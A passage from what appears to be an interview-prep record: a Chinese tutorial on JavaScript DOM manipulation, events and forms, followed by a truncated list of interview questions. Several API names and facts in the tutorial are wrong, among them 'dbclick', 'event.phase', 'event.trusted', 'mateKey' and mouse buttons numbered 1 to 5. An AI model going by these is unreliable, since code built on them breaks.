`#comment`,`#document`。也能通过节点名称判断节点类型，但基本不用。\n    \n-   **获取或设置节点值**：`node.nodeValue`，**文本节点或注释节点返回文本内容，元素节点与document节点返回null**。读写属性，支持`node.nodeValue = \"A simple text\"`。同样的，空白文本也被包含在内容里。\n    \n    > 提醒：文本节点和注释节点有一个`data`属性，使用与`nodeValue`相同，但它不是在Node接口上的。\n    \n-   判断节点是否拥有子节点：`node.hasChildNodes()`，返回true当节点有子节点时。\n    \n-   判断节点是否拥有特定子节点：`node.contains(childNode)`，返回true当childNode是node的子节点。\n    \n\n### 3.2、元素节点操作（重点）\n\n大部分情况下我们都是在元素节点上操作它的文本子节点，所以元素是我们最关心的节点，\\*\\*[Element](https://developer.mozilla.org/zh-CN/docs/Web/API/Element \"https://developer.mozilla.org/zh-CN/docs/Web/API/Element\")\\*\\*接口提供了更多的属性和方法。这里只考虑HTML元素。\n\n> 解惑：那什么时候需要操作文本节点？会看1.3节的例子，`A simple text`的父节点是`body`，但body有其它元素节点。假如没有文本这种类型的节点，很难在body节点上只修改`A simple text`的内容。\n\n-   判断元素类型：`elem.tagName`或`elem.nodeName`，效果一样，返回标签的字符串，如`audio`。另外，使用`instanceof`可以实现不同级别的类型判断。\n    \n-   元素内容：有几个属性和元素内容相关：\n    \n    -   `elem.innerHTML` -- 获取或设置元素内的HTML片段。**设置的内容会被当成HTML片段解析，可能会引起文档结构的变化。**\n        \n        > 注意：HTML片段内的脚本不会执行。\n        \n    -   `elem.textContent` -- 获取或设置元素的文本内容（标签被忽略）。设置的文本以安全模式（不会被解析）写入。\n        \n    \n    使用区别请参看[实验探究innerHTML，innerText，textContent的使用区别](https://juejin.cn/post/6874822868304134158 \"https://juejin.cn/post/6874822868304134158\")。\n    \n\n#### 3.2.1、元素的特性和属性\n\n**特性**（attribute）是指html中写在标签内的特性，而**属性**（property）是只元素节点作为编程对象具有的属性。\n\n-   `特性 -- 属性同步机制`：对标准规定的特性，元素对象具有响应的读写属性, 如`a.href`。这种机制极大的方便了在JS中获取或修改元素的特性。\n    \n    > 提醒：对不同HTML元素，规定的特性不同，属性也就不同，如: 存在`a.href`但不存在`div.href`。\n    \n-   通用的特性操作接口：\n    \n    -   `elem.hasAttribute(name)` -- 检查是否存在某个特性。\n    -   `elem.getAttribute(name)` -- 获取某一特性的值。\n    -   `elem.setAttribute(name, value)` -- 设置某一特性。\n    -   `elem.removeAttribute(name)` -- 删除某一特性。\n    -   `elem.attributes()` -- 获取所有的特性对，每个特性对具有`name`,`value`属性。\n-   特殊的`data-*`：[data-\\*](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/data-* \"https://developer.mozilla.org/zh-CN/docs/Web/HTML/Global_attributes/data-*\")特性是一种合法且安全的传递自定义数据的方式。可通过`elem.dataset.name`读取或修改data特性的值。属性名称采用驼峰写法，如elem上的`data-apple-price`对应`elem.dataset.applePrice`。\n    \n\n#### 3.2.2、元素的类和样式\n\n修改样式有两种方式，一是把样式写到某个类里，然后在代码中修改元素的类，一是直接修改`elem.style.*`。前者适用于随状态改变样式的情况，在代码可维护性上更加，用得较多。后者适用于频繁计算或切换的样式。\n\n-   `elem.classList`: 一个包含elem所有类的可迭代的类数组对象。这个对象有几个方法，方便我们改变元素的类。\n    -   `elem.classList.contains(class)` -- 检查是否有某个类。\n    -   `elem.classList.add(class)` -- 添加某个类。\n    -   `elem.classList.remove(class)` -- 移除某个类。\n    -   `elem.classList.toggle(class)` -- 切换某个类，如果有就删除，没有就添加。\n-   `elem.className`: 一个读写属性，把元素的class特性当成一个整体看待。如HTML中某个元素elem存在特性`class=\"first red\"`，那么`elem.className`的值为`first red`。\n\n> 区分：通过`elem.classList`或`elem.className`都可以对元素的类进行改动，前者更加灵活，且具有相应的方法，后者是一个整体的字符串属性，适合删除所有的类重新设置。\n\n如果需要直接设定元素的样式，可以设置`elem.style.*`。\n\n```js\nelem.style.width = \"20px\";     //设置元素宽度\nelem.style.backgroundColor = \"red\";     //设置颜色\n```\n\n> 提醒：多词CSS属性的转化方式也是驼峰写法，如`padding-left`对应`elem.style.paddingLeft`，`-webkit-border-radius`对应`elem.style.WebkitBorderRadius`，`-`意味着大写。\n\n> 补充：经常使用`node.hidden = true`实现节点隐藏，也能用于隐藏文本，在元素上，它的效果与`elem.style.display:none`一致。\n\n这种方式实际上是通过元素上的`style`特性实现的，它的优先级高于一般的CSS，所以都是有效的，除非你在其它地方用了`!important`。`elem.style.*`也是可读取的，\\*\\*但是它们只会读取元素中`style`特性存在的属性，\\*\\*对其它CSS是无效的。但我们往往需要的是最终应用在元素的样式数值。这种时候，需要使用\n\n-   `getComputedStyle(elem)` ：获取元素最终应用的样式，它返回一个样式对象，比如，可通过`getComputedStyle(elem).backgroundColor`获取颜色值。\n\n> 注意：`getComputedStyle`不支持简写属性，如getComputedStyle(elem).padding是无效的。\n\n```html\n<style>\n    div {\n        font-size: 20px;\n    }\n</style>\n<div id=\"div\" style=\"padding:20px;\">\n    czpcalm\n</div>\n<script>\n    console.log(div.style.fontSize);   //\"\"    style特性上没有该CSS属性，所以为空\n    console.log(div.style.padding);     //20px\n    console.log(getComputedStyle(div).fontSize);   //20px\n</script>\n```\n\n如果需要`清除代码设定的样式`, 可以把`elem.style.cssAttr`设为`\"\"`(空字符串)，副作用是原来html中的特性样式也会被清除。\n\n还有一种基本不会使用的重写整个元素style特性的方式`elem.cssText = csstext`，csstext不包含选择器和花括号。\n\n#### 3.2.3、元素的位置和尺寸\n\n当设计元素的大小变化或位置移动时，我们需要获取元素的位置或尺寸。设置则用CSS方式设置。\n\n位置是相对于参照物的，一个元素，有`相对于定位父元素`，`相对于视口`，`相对于文档`三种关系位置。\n\n> 提醒：定位父元素是指CSS定位元素（position为relative，absolute，fixed）或td，th，table元素，或者是body元素。\n\n-   相对于定位父元素：`elem.offsetLeft/offsetTop` ，相对于参照父节点的左/上边距。`elem.offsetParent`获取元素的定位父元素。\n    \n-   相对于视口：\\*\\*[elem.getBoundingClientRect()](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getBoundingClientRect \"https://developer.mozilla.org/zh-CN/docs/Web/API/Element/getBoundingClientRect\")\\*\\*获取元素的定位矩形`elemRect`。\n    \n    -   `elem.getBoundingClientRect().left/top/right/bottom`分别表示元素盒子（含边框）四角到视口左或上边的距离。\n    -   `elem.getBoundingClientRect().width/height`, 与`elem.offsetWidth/offsetHeight`等效，盒子的宽高。\n    -   `elem.getBoundingClientRect().x/y` ，一般情况下，与`elem.getBoundingClientRect().left/top`等效，且不兼容IE，不推荐使用。\n-   相对于文档：没有直接获取的方式，但可以通过`相对于视口+滚动距离`简单计算。\n    \n    -   盒子上方相对于到文档的距离：`elem.scrollTop + elem.getBoundingClientRect().top`。\n    -   盒子左边到文档的距离：`elem.scrollLeft + elem.getBoundingClientRect().left`。\n\n元素盒子的尺寸也有多种情况，需要考虑边框、内边距、是否为标准盒子模型、甚至是否有滚动条。\n\n-   含边框的盒子尺寸：`elem.offsetWidth/offsetHeight`或者`elem.getBoundingClientRect().width/height`都可以获取含边框的宽高。\n    \n-   边框宽度：`elem.clientLeft/clientTop` -- 元素左上角边框的宽度。可以理解为左边框宽度和上边框的宽度，如果存在滚动条，也包含滚动条的宽度。\n    \n    > 补充：一般来说，上边框和左边框是常用的。如果四条边框宽度不一，可以通过`getComputedStyle(elem).borderRight`获取，注意这是含单位的字符串。\n    \n-   `elem.clientWidth/clientHeight` -- 内容宽度高度，包含padding，不包含滚动条。\n    \n-   不含边框：`elem.clientWidth/clientHeight`，获取元素盒子内容宽高，不含边框和滚动条，含padding。\n    \n-   内边距问题与盒子类型：在涉及内边距的时候，需要`getComputedStyle(elem)`方法获取，并且需要考虑是否为标准盒子。\n    \n\n如果元素的内容存在滚动时，我们可能需要知道与滚动相关的尺寸：\n\n-   `elem.scrollLeft/scrollTop` -- 水平和垂直方向上滚动的长度。可写属性，通过设置该值改变控制内容滚动。\n    \n-   `elem.scrollWidth/scrollHeight` -- 元素内容的长度和宽度，包括滚动的内容。\n    \n    > 区分：在没有内容溢出发生滚动时，`clientWidth/Height`与`scrollWidth/Height`等效；存在滚动时，前者是盒子的可视内容大小，后者是内容的大小，包括需要滚动查看的部分。\n    \n\n关于位置和尺寸，没有图片难以说清，不理解请参看：\n\n-   [现代Javascript教程：元素大小与滚动](https://zh.javascript.info/size-and-scroll \"https://zh.javascript.info/size-and-scroll\")\n-   [现代Javascript教程：坐标](https://zh.javascript.info/coordinates \"https://zh.javascript.info/coordinates\")\n-   [位置与尺寸探究](https://codepen.io/czpcalm/pen/yLOQroM \"https://codepen.io/czpcalm/pen/yLOQroM\")\n\n## 4、修改文档（重点）\n\nDOM操作中，经常需要修改文档结果或内容。这类操作涉及节点的插入、移除、替换等。\n\n文档的操作有一套广泛使用的传统方法。也有一套新推出的API方法，它们更加灵活易用，但IE不兼容。\n\n### 4.1、插入节点\n\n插入节点可以分三步走：\n\n1.  创建一个节点：\n    \n    -   创建一个元素节点: `let elem = document.createElement(tagName)`。\n    -   创建一个文本节点：·`let text = document.createTextNode(data)`。\n    -   从已有节点克隆：`let dupNode = node.cloneNode(deep)`, deep为true表示深拷贝，常用。默认为false。\n2.  编辑节点的属性和内容\n    \n3.  把节点插入文档树中\n    \n    -   传统方式：传统方式需要在父节点上执行对节点的插入\n        \n        -   `parentNode.appendChild(node)` -- 把node作为最后一个子节点插入。\n        -   `parentNode.insertBefore(node, nextSibling)` -- 在nextSibling之前插入node。\n    -   现代方式：可以实现多位置插入，你可以在父节点上执行插入或在兄弟节点上执行插入。\n        \n        -   `parentNode.prepend(...nodes or strings)`。在第一个子节点之前插入。\n            \n        -   `parentNode.append(...nodes or strings)`。在最后一个子节点之后插入。\n            \n        -   `nextSibling.before(...nodes or strings)`。在本节点之前同级插入。\n            \n        -   `previousSibling.after(...nodes or strings)`。在本节点之后同级插入。\n            \n        \n        > 提醒：参数的形式说明它们支持一次插入多个，并且字符串会作为文本节点插入。\n        \n\n有一种情况，我们希望直接描述节点的插入HTML代码段，这种时候，可以使用之前的`elem.innerHTML`属性, 或者使用\\*\\*[elem.insertAdjacentHTML(position, html)](https://developer.mozilla.org/zh-CN/docs/Web/API/Element/insertAdjacentHTML \"https://developer.mozilla.org/zh-CN/docs/Web/API/Element/insertAdjacentHTML\")\\*\\*进行插入。其中，`position`的可选值有：`\"beforebegin\"`, `\"afterbegin\"`, `\"beforeend\"`, `afterend`.\n\n> 区分：**节点对象存在不同于节点在文档树中**。前者只是在代码中可以通过node等变量名称引用节点，但创建一个节点，并不会对文档树结构有影响，只有插入文档树后，节点才成为文档的一部分。反之，从文档中移除节点，并不会导致节点变量实效，它还是存在，可以继续被修改，并在某个时间点重新插入文档中。\n\n### 4.2、移除节点\n\n从文档树中移除更加简单。\n\n1.  找到需要移除的节点。参考节点导航与搜索小节。\n2.  移除节点：`node.remove()`，移除节点。但IE不兼容，需要使用传统方式，获取其父节点，在父节点上移除子节点：`node.parentNode.removeChild(node)`。\n\n### 4.3、替换节点\n\n与移除类似，使用`node.repalceWith(...nodes or strings)`，同样IE使用`parentNode.replaceChild(newNode, node)`。\n\n## 5、事件处理\n\n### 5.1、基本概念\n\n-   `事件`是某事发生的信号, 所有的DOM对象都具有这些信号。\n-   `事件处理程序`是当一个事件信号发生时运行的函数，用于对事件作出响应。\n-   `事件处理`就是为事件分配正确的处理函数，在事件发生时作出正确处理。\n-   `事件类型` 是事件的分类，[常见的事件类型有](https://developer.mozilla.org/zh-CN/docs/Web/Events#%E6%9C%80%E5%B8%B8%E8%A7%81%E7%9A%84%E7%B1%BB%E5%88%AB \"https://developer.mozilla.org/zh-CN/docs/Web/Events#%E6%9C%80%E5%B8%B8%E8%A7%81%E7%9A%84%E7%B1%BB%E5%88%AB\")\n    -   鼠标事件：`click`, `contextmenu`, `dbclick`, `mousedown`, `mouseup`,`mouseover`, `mouseout`等。\n    -   键盘类型：`keydown`, `keyup`\n    -   焦点事件：`focus`, `blur`, `focusin`, `focusout`,\n    -   表单事件: `submit`, `reset`\n    -   剪切板事件: `cut`, `copy`, `paste`\n    -   资源事件：`load`, `unload`, `error`, `abort`\n-   `事件对象`是事件在编程上的对象，具有很多和事件相关的属性。常常在处理函数调用时自动作为参数传入。\n\n### 5.2、事件流\n\n\\*\\*假设一个div元素中放了一个button元素，如果点击了button，算不算点击了div？如果算，是先点击了button还是先点击了div？\\*\\*因为元素的嵌套关系，使得事件的产生对象往往是嵌套的，而不是独立的，在上面的中，还有body元素，html元素，甚至整个文档document。\n\n第一个问题，对大多数的事件来说，应该是肯定的，一个在子元素上发生的事件，也看做在该元素上发生了。\n\n第二个问题，也被看成`事件流`问题，即如何确定事件在节点中的传播顺序。巧的是，当年IE和Netscape分别提出了`事件冒泡`和`事件捕获`这两个几乎完全相反的概念。\n\n-   事件冒泡：事件从最小的发生对象开始依次往外围对象冒泡。即`button->div->body->html->document`。\n-   事件捕获：事件从整个文档开始依次向最小目标捕获。即`document->html->body->div->button`。\n\n为了统一这两种观点，DOM事件规范提出了3阶段的事件流：`事件捕获阶段->目标阶段->事件冒泡阶段`。\n\n然而，事件捕获阶段很少被使用，下面的讨论会忽略事件捕获，默认事件从目标上开始冒泡。\n\n> 注意：并非所有事件都会冒泡。\n\n### 5.3、事件处理函数\n\n#### 5.3.1、3种事件处理方式\n\n有3种为设置事件处理函数的方式：\n\n1.  HTML特性处理：在HTML元素标签中使用`on<event>`特性。\n2.  DOM0级事件处理：把处理函数赋给节点的对象的`on<event>`属性。\n3.  DOM2级事件处理：使用`node.addEventListener(event, handler, capture)`和`removeEventListener(event, handler)`。`capture`是一个布尔值，表示是否在捕获阶段响应。\n\n> 对比：HTML特性的方式具有很大的局限性，代码量限制，维护性差，某些事件不支持等。DOM0级事件也对某些事件不支持，关键在于无法为一个事件类型分配多个处理函数。DOM2解决了这些问题，是最通用的方式，推荐使用。\n\n```html\n<div id=\"div1\" onclick=\"alert(event.type+': div1')\">div1</div>\n<div id=\"div2\" onclick=\"handler('div2',event)\">div2</div>\n<div id=\"div3\">div3</div>\n<div id=\"div4\">div4</div>\n<script>\n    function handler(message, event) {\n        alert(event.type + \": \" + message);\n    }\n\n    div3.onclick = e => handler(\"div3\", e);  //处理函数具有多参数，需要嵌套调用。\n\n    div4.addEventListener(\"click\", e => handler(\"div4\", e), false);\n</script>\n```\n\n上面的例子中, div1和div2使用了HTML特性添加事件处理，div3使用DOM0级事件处理，div4使用DOM2级事件处理。\n\n**HTML特性的内容会成为事件处理函数的内容，DOM事件处理赋值的是函数对象**。比如对一个处理函数`func`，特性上的写法是`onclick=\"func()\"`，而DOM0级事件处理的写法是`node.onclick=func`。区分它们的主要点在于理解特性的内容会被套上一个函数外壳，然后成为处理函数。`onclick=\"func()\"`最后的效果是：\n\n```js\nnode.onclick = function(event){   //传递的事件参数名为event\n    func();         //这一行是来自特性\n}\n```\n\n这样，你应该能明白为什么特性上是函数调用，而DOM上是函数对象赋值了。\n\n因为这种设定，还产生两个要注意的点。\n\n第一是事件对象参数`event`，如果你习惯了在DOM事件处理中使用变量名称`e`而不是`event`，那么在特性内容上可能写出类似`e.type`的表达，这是错误的，因为特性传入的事件变量名是`event`。\n\n第二，在试图阻止事件的默认响应的时候，可能会写出这样的代码：\n\n```html\n<a href=\"www.baidu.com\" onclick=\"handler()\">百度</a>\n<script>\n\tfunction handler(){\n        /*....处理点击事件*/\n        return false;   //返回false阻止跳转\n    }\n</script>\n```\n\n然而点击之后还是发生跳转了，问题出在哪里？让我们看一下最后生成的处理函数：\n\n```js\na.onclick = function(event){\n    handler();\n}\n```\n\n事件处理函数只是调用了`handler`，`handler`返回了false，而事件处理函数并没有理会，所以，外部看来，事件处理函数没有返回值。正确的写法应该是`onclick=\"return handler()\"`或者`onclick=\"handler();return false;\"`。\n\nDOM2级事件处理之前，一个事件只能对应一个事件处理函数。如果你想解除事件处理函数，可以简单的采用`node.on<event>=null`的方式。\n\nDOM2`node.addEventListener()`支持添加多个处理函数，这些处理函数的**执行顺序与添加顺序一致**，可以使用`node.removeEventListener(event, handler)`解除处理函数。\n\n> 注意：`removeEventListener(handler)`必须使用添加时的**同一个函数**，而不是具有相同执行体的函数。\n> \n> ```js\n> node.addEventListener(\"click\", ()=>alert(\"直接添加函数表达式将无法别移除！\"), false);\n> let handler = ()=>alert(\"something\")\n> node.addEventListener(\"click\", handler, false);\n> node.removeEventListerner(\"click\", ()=>alert(\"somthing\"));    //无效，传入的是不同的函数对象\n> node.removeEventListener(\"click\", handler);         //成功移除\n> ```\n\n#### 5.3.2、事件处理函数的参数\n\n让我们看另一个问题，事件处理函数的参数问题。\n\n我们只编写事件处理函数，函数在事件发生时自动被调用，它的调用语句类似这样\n\n```js\nnode.handler(event);   //event在这里是实参，这句语句是函数调用\n```\n\n我们要根据调用规范自己的`handler`函数。\n\n调用时传入了一个参数，根据JS函数参数的特点，如果在事件处理函数中没有使用到`event`，那处理函数可以不声明这个参数。其次，形参可以使用任何合法变量名，我们可以不函数定义写成`handler(e)`，然后在函数内使用`e`而不是`event`。\n\n它的调用方式决定了`handler`最多只能有一个参数。但在事件处理时确实有需要多个参数的时候，这种时候要使用嵌套的函数调用，如上面的例子。\n\n最后，注意这种调用方式使得函数内部`this === node`。这很有用，方便我们在事件处理的时候获取到事件发生对象的信息。\n\n### 5.4、事件对象\n\n事件对象`event`在调用事件处理函数时自动传入，它具有很多属性和方法，在事件处理的时候大有用处。\n\n-   **`event.preventDefault()`** -- 取消事件的默认行为，只有`event.cancelable`为true时才有效。\n    \n    > 补充：如果使用`on<event>`方式添加处理函数，在函数返回false也可以取消默认事件。\n    \n-   **`event.stopPropagation()`** -- 停止事件的继续冒泡，上层的事件响应不会再发生。\n    \n-   `event.stopImmediatePropagation()` -- 停止事件继续响应。包括事件冒泡和当前目标的其它处理函数也不会发生。\n    \n-   **`event.type`** -- 事件类型字符串，在使用一个处理函数处理多类事件时，可以判断当前发生的事件类型。\n    \n-   \\*\\*`event.target`与`event.currentTarget` \\*\\*-- 事件的最小目标和事件的当前目标。\n    \n    > 区分：事件在最小目标上发生，然后往上冒泡的过程中，`event.target`始终不变，指向最小目标，但`event.currentTarget === this`，会随着冒泡过程指向当前正在处理的节点。\n    \n-   `event.phase` -- 事件流阶段，整数，1代表捕获，2代表目标阶段，3代表冒泡阶段。\n    \n-   `event.bubbles` -- 布尔值，事件是否冒泡。\n    \n-   `event.cancelable` -- 布尔值，事件是否可取消默认行为。\n    \n-   `event.trusted` -- 布尔值，如果事件是浏览器发生的，为true，如果事件是js代码发生的，为false。\n    \n\n上面的属性都是**只读**的。\n\n这些属性和方法是通用的，对具体的事件类型，有更多的事件属性和方法，将在每种事件中详细说明。\n\n### 5.5、鼠标事件\n\n鼠标事件是最常见的一类事件，有：\n\n-   `click` -- 鼠标左键**点击**触发，或触摸屏的点击。\n    \n    > 提醒：**点击**一次的含义是鼠标**在目标上**按下并松起，如果鼠标按下后滑动到元素外部松起，或者元素位置变化导致鼠标松起时不再元素上方，不能形成有效点击。\n    \n-   `contextmenu` -- 鼠标右键点击事件，该事件浏览器一般有默认的菜单，如果需要实现自定义菜单，需要阻止默认行为。\n    \n-   `dbclick` -- 双击鼠标左键。双击具有选择文本的默认行为。\n    \n-   `mousedown/mouseup` -- 鼠标**任意键**按下/松起。\n    \n-   `mouseenter/mouseleave` -- 鼠标进入/离开元素，不会冒泡。\n    \n-   `mouseover/mouseout` -- 鼠标进入/离开元素，会冒泡，进入/离开子元素时也会触发。\n    \n    > 区分：`mouseenter/mouseleave`与`mouseover/mouseout`事件类似，但是后者会冒泡，且在进入子元素会触发`mouseout`。\n    \n-   `mousemove` -- 鼠标按下后松起前发送移动。\n    \n\n鼠标点击时，会发生一系列事件，它们具有特定的顺序，以某次双击为例，依次触发事件`mousedown->mouseup->click->mousedown->mouseup->click->dbclick`。\n\n鼠标事件有一些适合获取事件相关信息的属性：\n\n-   鼠标按键：按键属性只对`mousedown/mouseup`有意义，`event.button`，数字`1~5`，代表鼠标上的按键，依次是：鼠标左键，中键，右键，前进，后退。\n    \n-   坐标：它们是事件发生时刻（定点类）的坐标，或者实时的（`mousemove`）坐标。\n    \n    -   `event.pageX/pageY` -- 相对于文档的坐标。\n    -   `event.clientX/clientY` -- 相对于窗口的坐标。\n    -   `event.screenX/screenY` -- 相对于屏幕的坐标，较少使用。\n-   组合键：在鼠标事件发生时，如果下列按键被按下，对应的属性为true。用于在一个事件类型上绑定多种任务。\n    \n    -   `event.shiftKey` -- `shift键`是否被按下。\n        \n    -   `event.ctrlKey` -- `ctrl键`是否被按下。\n        \n    -   `event.altKey` -- `alt键`是否被按下。\n        \n    -   `event.mateKey` -- `cmd键`(Mac专用)是否被按下。\n        \n    \n    > 提醒：如果想处理`ctrl键`，应该注意在Mac下使用`cmd键`，所以应该判断`if(event.ctrlKey||event.cmdKey)`。\n    \n-   相关目标：`event.relatedTarget`。`mouseenter/mouseleave`和`mouseover/mouseout`事件的属性。如果鼠标从`divA->divB`，在divA上发生mouseout（mouseleave），`event.target === divA`并且`event.relatedTarget === divB`。相反，在divB上发生mouseover（mouseenter），`event.target ===divB`且`event.relatedTarget === divA`。\n    \n\n这是[一篇鼠标拖放事件的文章](https://zh.javascript.info/mouse-drag-and-drop \"https://zh.javascript.info/mouse-drag-and-drop\")，应该能对鼠标事件的使用有所帮助。\n\n### 5.6、键盘事件\n\n键盘事件常常被用于创建各种热键。现在广泛使用的有两类键盘事件：\n\n-   `keydown` -- 按下任意键盘触发。持续按住按键会持续触发该事件。\n-   `keyup` -- 松开任意按键。\n\n> 补充：不要试图监听`Fn键`，它是在比OS更低的级别上实现的，没有键盘事件。\n> \n> 补充：有一个被取消的`keypress`事件，这里不讨论。\n\n键盘事件最重要的属性是键码，我们常常需要获取键盘的键码，根据按下的键盘做出响应。\n\n-   `event.code` -- 键码。**键码是唯一的**。在按键判断时，经常使用的属性。键码是字符串，常见规则：\n    \n    -   数字键码为`Digit<num>`或`Numpad<num>`(小键盘)。如`Digit2`, `Numpad2`\n        \n    -   字符按键`Key<letter>`, 如`KeyZ`, `KeyA`\n        \n    -   功能键一般为按键名称，如`F4`, `Tab`,`Enter`\n        \n    -   使用`Left/Right`区分左右，左shift的键码为`ShiftLeft`, 右shift的键码为`ShiftRight`。\n        \n    \n    > 补充：一个被废弃的`event.keyCode`与`event.code`有同样的功能，但键码是基于数字的。可能在兼容IE时需要用到。\n    \n-   `event.key` -- 键。表征按键的**含义**而不是位置。跟是否按下`shift`、键盘语言有关。如按下`z键`时表示字符`z`，而`shift+z`表示字符`Z`。左右shift的`key`也一样。只在使用基于意义的时候才使用`event.key`判断。\n    \n\n键盘事件也同样支持组合键，可以使用`event.ctrlKey`, `event.shiftKey`, `event.altKey`, `event.metaKey`获取其它按键是否被按下，而不用单独监听它们。\n\n### 5.7、资源事件\n\n有一类与资源相关的事件，认识它们的最好方式是通过页面生命周期：\n\n-   `DOMContentLoaded` -- 文档被加载并且DOM树构建完成后（图片、样式可能还未加载）。\n-   `load` -- 页面内容加载完毕，所有图片、样式资源都已应用。此时进行的操作都是安全的。\n-   `beforeunload` -- 用户正打算离开，可以在此时讯问用户是否离开，或者保存一些数据。\n-   `unload` -- 用户已经离开，但仍可以进行少量操作，如释放资源，发送数据。\n\n`load`事件是这里最重要的一个事件。它不仅可以用于确保页面加载完成后执行任务，还可以添加到`img`, `script`, `style`这些节点中，在它们完成资源加载时候进行事件处理。\n\n## 6、番外篇：表单操作\n\n### 6.1、表单导航\n\n表单是一类特殊的元素，需要频繁的获取或修改，所以，通用的节点获取方式上，增加了额外的属性，方便表单操作。\n\n-   `document.forms` -- 获取文档中的表单元素集合。这是一个`命名集合`。命名意味着可以通过表单名称方式`document.forms.formName`获取表单，而集合本身又支持下标方式`document.form[0]`。\n    \n-   `form.elements` -- 获取表单form的输入元素集合，同样，这是一个`动态的`命名集合。可以通过`form.elements.inputName`或者`form.elements[index/inputName]`获取。\n    \n-   `form.inputName`或`form[index/inputName]` -- 获取表单form的输入元素。`form.elements.inputName`的简写。\n    \n    > 注意：\n    > \n    > （1）radio、checkbox等多个输入共享一个name时，`form.elements.inputName`或`form.inputName`返回一个集合。\n    > \n    > （2）无法获取到type为image的输入组件。\n    > \n    > （3）如果表单中有`<fieldset>`(输入组)，它会成为一个`form.elements`的一个元素，可进一步通过`fieldset.elements`获取表单组中的输入控件集合。\n    \n-   `input.formName` -- 获取输入元素所在的表单。`form.inputName`的反向引用。\n    \n\n```html\n  <form name=\"myForm\">\n  \t<input type=\"text\" name=\"user\"/>\n      <input type=\"radio\" name=\"sex\" value=\"male\"/>\n      <input type=\"radio\" name=\"sex\" value=\"female\"/>\n  </form>\n  <script>\n      let form = document.forms.myForm;   //或者document.forms[0]\n      let userInput = form.user;          //或者form.elements.user\n      let sexInput = form.sex;\n      sexInput[0].checked = true;           //选择第一个radio\n      console.log(sexInput.value);       //male\n  </script>\n```\n\n### 6.2、表单基础\n\n根据属性--特性同步，表单对象有以下属性，它们与对应的特性意义相同。\n\n-   `form.action`\n-   `form.method`\n-   `form.name`\n-   `form.target`\n\n另外，表单有两个常用的方法：\n\n-   `form.submit()` -- 手动提交表单\n-   `form.reset()` -- 初始化表单内容\n\n一个表单含有多个输入字段，它们可以是`各类型的input标签`，`select标签`，`textarea标签`，`button标签`。每这些表单字段有一些通用的属性（当然还有其它的同步属性）：\n\n-   **`input.value`** -- 字段的值。对`type=\"file\"`的input，它是只读的，表示计算机上的文件地址。\n-   `input.name` -- 字段名称。\n-   `input.type` -- 字段类型，对`textarea`是`\"textarea\"`。对`select`是`\"select-one\"`或`\"select-multiple\"`。\n-   `input.tabindex` -- 字段的tab索引。\n-   **`input.disabled`** -- 字段是否被禁用。\n-   `input.readOnly` -- 字段是否只可读。\n\n这些属性都是可写的，大大便利了我们对表单元素的操作。\n\n最关键，要数`input.value`，对不同字段，它有不同的用法：\n\n-   `button`, `reset`, `submit`类型：表示用于显示的字符串。\n-   `radio`, `select(单选)`类型：一个与被选中字段value相同的值。\n-   `textbox`，`select(多选)`类型：一个数组，对应被勾选的选线的值。\n-   其它类型：与填写的值一致。\n\n### 6.3、表单事件\n\n有些事件是表单特有的：\n\n-   ·`submit` -- 表单提交**前**发生的事件。\n-   `reset` -- 点击reset按钮时。\n-   `input` -- 在字段输入任意内容后。\n-   `change` -- 字段失去焦点后，与之前输入发生变化时。\n\n此外，也有一些事件在表单上发挥了主要作用：\n\n-   `pressdown`\n    \n-   `focus/blur` -- 获得或焦点时，不会冒泡。\n    \n-   `focusin/focusout` -- 获得或失去焦点时，与上类似，但是会冒泡。\n    \n-   `cut/copy/paste` -- 剪切板事件\n    \n    > 补充：可以通过`e.preventDefault()`(或返回false)取消剪切板事件默认行为，来禁用页面/输入的剪切板功能。`event.clipboardData`可用于读写剪切板内容。\n    > \n    > ```js\n    > input.addEventListener(\"past\", (event)=>{\n    >     let data = e.clipboardData;\n    >     alert(\"Data in clipboard: \" + data+\". But you can't paste!\");\n    >     return false;\n    > })\n    > ```\n    \n\n### 6.4、表单验证与表单提交\n\n表单客户端验证几乎成为表单最重要的一个功能，这可是JS诞生的缘由呀！\n\nhtml5提供了一套[表单的验证API](https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation \"https://developer.mozilla.org/en-US/docs/Learn/Forms/Form_validation\")，但个人认为难用且界面依赖浏览器，使用不多，更多是自定义表单的验证方式。\n\n表单验证主要有两种思路，一是在客户完成每个字段输入时，独立验证，每个字段，所有字段都通过后才允许提交操作。这种方式主要利用`change`, `input`等事件。\n\n一是在用户发起提交操作时，对整个表单进行验证，如果不通过则提醒用户更正，阻止表单提交，直到所有字段正确。这种方式主要使用`submit`事件。\n\n## 7、总结\n\n![](https://static.ecool.fun//article/37a1a519-5487-46fd-a78c-8f2499620e35.awebp)\n",
    "testPoint": "### 1. **DOM 的基本概念**\n   - 什么是 DOM？为什么前端开发中需要操作 DOM？\n   - DOM 树是什么？你能简单描述一下 HTML 如何被解析成 DOM 树吗？\n\n### 2. **DOM 查询与选择**\n   - 你常用的 DOM 查询方法有哪些？请简要说明 `getElementById`、`getElementsByClassName`、`querySelector`、`querySelectorAll` 的区别。\n   - 在选择多个相同元素时，如何在 `querySelectorAll` 返回的 `NodeList` 上进行遍历？常用的方式有哪些？\n\n### 3. **DOM 的创建与插入**\n   - 如何使用 JavaScript 动态创建元素？请描述 `document.createElement` 的用法。\n   - 你通常如何将新创建的 DOM 元素插入到已有的页面结构中？请举例说明 `appendChild`、`insertBefore` 的使用方法。\n\n### 4. **DOM 的修改与删除**\n   - 如果你想修改一个元素的内容或属性，通常会使用哪些方法？例如 `textContent` 和 `innerHTML` 的区别是什么？\n   - 你如何删除一个 DOM 元素？`removeChild` 和 `remove` 方法有什么区别？\n\n### 5. **操作 DOM 样式**\n   - 如何通过 JavaScript 设置或获取元素的样式？请解释 `style` 属性的使用。\n   - `classList` 是如何帮助你操作元素的样式类名的？请说明 `classList.add`、`classList.remove`、`classList.toggle` 等方法的作用。\n\n### 6. **事件处理**\n   - 如何给 DOM 元素绑定事件？请比较 `addEventListener` 与 `onclick` 的不同之处。\n   - 事件委托是什么？你如何在大型项目中使用事件委托来提升性能？\n\n### 7. **DOM 性能优化**\n   - 在处理大量 DOM 更新时，如何避免频繁的重绘和重排？有哪些优化技巧？\n   - 你知道什么是文档片段（`DocumentFragment`）吗？它在批量添加 DOM 元素时有什么作用？\n\n### 8. **虚拟 DOM 与真实 DOM 的对比**\n   - 什么是虚拟 DOM？你认为它是如何提高性能的？\n   - 使用真实 DOM 操作和使用虚拟 DOM 操作的区别是什么？为什么现代前端框架（如 React、Vue）更偏向于使用虚拟 